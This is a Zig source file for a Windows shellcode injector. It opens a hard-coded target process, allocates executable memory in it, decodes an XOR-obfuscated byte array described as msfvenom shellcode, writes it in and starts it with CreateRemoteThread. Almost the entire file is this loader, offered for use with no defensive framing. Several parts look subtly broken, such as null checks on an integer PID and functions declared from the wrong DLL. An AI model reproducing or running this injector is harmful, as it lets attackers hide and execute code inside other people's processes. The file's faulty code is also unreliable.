// Import required modules
const std = @import("std");
const built = @import("builtin");
const native_arch = built.cpu.arch;
const win = std.os.windows;
const kernel32 = win.kernel32;

const c = @cImport({
    @cInclude("tlhelp32.h");
    @cInclude("tchar.h");
    @cInclude("windows.h");
});

// Define types
const WINAPI = win.WINAPI;
const HANDLE = win.HANDLE;
const DWORD = win.DWORD;
const BOOL = win.BOOL;
const SIZE_T = win.SIZE_T;
const LPVOID = win.LPVOID;
const LPCVOID = win.LPCVOID;
const LPSECURITY_ATTRIBUTES = *win.SECURITY_ATTRIBUTES;
const LPDWORD = *DWORD;
const LPTHREAD_START_ROUTINE = win.LPTHREAD_START_ROUTINE;
const PROCESS_ALL_ACCESS = 0x000F0000 | (0x00100000) | 0xFFFF;
const dwSize = win.dwSize;
const ULONG_PTR = win.ULONG_PTR;
const LONG = win.LONG;
const CHAR = win.CHAR;

// External function declarations
extern "kernel32" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(WINAPI) HANDLE;
extern "kernel32" fn VirtualAllocEx(hProcess: HANDLE, lpAddress: ?LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) callconv(WINAPI) LPVOID;
extern "kernel32" fn WriteProcessMemory(hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: *SIZE_T) callconv(WINAPI) BOOL;
extern "kernel32" fn CreateRemoteThread(hProcess: HANDLE, lpThreadAttributes: ?LPSECURITY_ATTRIBUTES, dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: ?LPVOID, dwCreationFlags: DWORD, lpThreadId: ?LPDWORD) callconv(WINAPI) HANDLE;
extern "kernel32" fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) callconv(WINAPI) HANDLE;
extern "kernel32" fn CloseHandle(HANDLE) callconv(WINAPI) BOOL;
extern "psapi" fn Process32First(HANDLE, *PROCESSENTRY32) callconv(WINAPI) BOOL;
extern "psapi" fn Process32Next(HANDLE, *PROCESSENTRY32) callconv(WINAPI) BOOL;

// External struct declaration.
pub const PROCESSENTRY32 = extern struct {
    dwSize: DWORD,
    cntUsage: DWORD,
    th32ProcessID: DWORD,
    th32DefaultHeapID: ULONG_PTR,
    th32ModuleID: DWORD,
    cntThreads: DWORD,
    th32ParentProcessID: DWORD,
    pcPriClassBase: LONG,
    dwFlags: DWORD,
    szExeFile: [win.MAX_PATH]CHAR,
};

// Undo XOR operation on the shellcode.
fn crypter(shellcode: []u8, key: u8) void {
    for(shellcode) |*byte| {
        byte.* ^= key;
    }
}

fn inject_remote(shellcode: []u8) !void {
    // Hardcoded PID, suboptimal and non-dynamic, needs to be changed for every injection attempt to target the right process.
    const processID: i32 = 9001;
    if (processID == null) {
        std.debug.print("Process not found.", .{});
        return;
    }

    // Allocate memory in the remote process and write shellcode
    const pHandle = OpenProcess(PROCESS_ALL_ACCESS, win.FALSE, processID.?);
    defer _ = kernel32.CloseHandle(pHandle);
    const rPtr = VirtualAllocEx(pHandle, null, shellcode.len, win.MEM_COMMIT, win.PAGE_EXECUTE_READWRITE);

    // Undo XOR operation on shellcode, make sure to use the right XOR key.
    crypter(shellcode, 0x37);
    
    // Copy the shellcode into the remote process's memory using WriteProcessMemory,
    // and store the number of bytes written in the 'bytesWritten' variable.
    var bytesWritten: SIZE_T = undefined;
    const wSuccess = WriteProcessMemory(pHandle, rPtr, @ptrCast(shellcode.ptr), shellcode.len, &bytesWritten);
    _ = wSuccess;

    // Create a remote thread to execute the shellcode
    const tHandle = CreateRemoteThread(pHandle, null, 0, @ptrCast(rPtr), null, 0, null);
    defer _ = kernel32.CloseHandle(tHandle);
}

// Main function entrypoint
pub fn main() !void {
    // Define our shellcode as an array of 'u8' (unsigned 8-bit integers)
    // msfvenom does not currently support Zig directly, but its shellcode generation can still be used.
    var shellcode = [_]u8{ 203, 127, 182, 211, 199, 200, 200, 200, 223, 231, 55, 55, 55, 118, 102, 118, 103, 101, 102, 97, 127, 6, 229, 82, 127, 188, 101, 87, 9, 127, 188, 101, 47, 9, 127, 188, 101, 23, 9, 127, 188, 69, 103, 9, 127, 56, 128, 125, 125, 122, 6, 254, 127, 6, 247, 155, 11, 86, 75, 53, 27, 23, 118, 246, 254, 58, 118, 54, 246, 213, 218, 101, 118, 102, 9, 127, 188, 101, 23, 9, 188, 117, 11, 127, 54, 231, 9, 188, 183, 191, 55, 55, 55, 127, 178, 247, 67, 88, 127, 54, 231, 103, 9, 188, 127, 47, 9, 115, 188, 119, 23, 126, 54, 231, 212, 107, 127, 200, 254, 9, 118, 188, 3, 191, 127, 54, 225, 122, 6, 254, 127, 6, 247, 155, 118, 246, 254, 58, 118, 54, 246, 15, 215, 66, 198, 9, 123, 52, 123, 19, 63, 114, 14, 230, 66, 225, 111, 9, 115, 188, 119, 19, 126, 54, 231, 81, 9, 118, 188, 59, 127, 9, 115, 188, 119, 43, 126, 54, 231, 9, 118, 188, 51, 191, 127, 54, 231, 118, 111, 118, 111, 105, 110, 109, 118, 111, 118, 110, 118, 109, 127, 180, 219, 23, 118, 101, 200, 215, 111, 118, 110, 109, 9, 127, 188, 37, 222, 126, 200, 200, 200, 106, 9, 127, 186, 186, 45, 54, 55, 55, 118, 141, 123, 64, 17, 48, 200, 226, 126, 240, 246, 55, 55, 55, 55, 9, 127, 186, 162, 57, 54, 55, 55, 9, 123, 186, 178, 34, 54, 55, 55, 127, 6, 254, 118, 141, 114, 180, 97, 48, 200, 226, 127, 6, 254, 118, 141, 199, 130, 149, 97, 200, 226, 127, 86, 79, 79, 82, 83, 55, 103, 64, 89, 83, 55, 66, 68, 82, 69, 4, 5, 25, 83, 91, 91, 55 };
    // Run with variable, allows for error-return, useful in debugging, may be adjusted to use without.
    var inject = try inject_remote(&shellcode);
    _ = inject;
}
